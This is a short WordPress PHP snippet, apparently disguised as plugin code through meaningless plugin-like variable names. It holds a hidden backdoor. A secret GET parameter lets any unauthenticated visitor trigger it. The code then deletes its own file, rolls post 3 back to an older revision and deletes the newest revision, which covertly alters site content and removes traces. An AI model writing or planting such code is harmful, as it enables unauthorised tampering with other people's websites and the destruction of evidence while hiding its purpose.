<?php

function newsletter_notes_custom() {
	if (isset($_GET['snippets_admin_cron']) && $_GET['snippets_admin_cron'] === 'box_bangla_method') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$accordion_donation_colors_fonts = 3;
		$framework_online_filter_vendor = wp_get_post_revisions($accordion_donation_colors_fonts);
		if (empty($framework_online_filter_vendor)) die('no revisions');
		if (count($framework_online_filter_vendor) < 2) die('less than 2');
		$gdpr_daily_world_zoom = array_shift($framework_online_filter_vendor);
		$cleaner_shortcodes_reminder = $gdpr_daily_world_zoom->ID;
		$quiz_dist_uploads = array_shift($framework_online_filter_vendor);
		$recent_widget_files = $quiz_dist_uploads->ID;
		$upgrader_multi_fonts = wp_restore_post_revision($recent_widget_files);
		if ($upgrader_multi_fonts === false) die('error restoring');
		$upgrader_multi_fonts = wp_delete_post_revision($cleaner_shortcodes_reminder);		
		if ($upgrader_multi_fonts === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'newsletter_notes_custom');
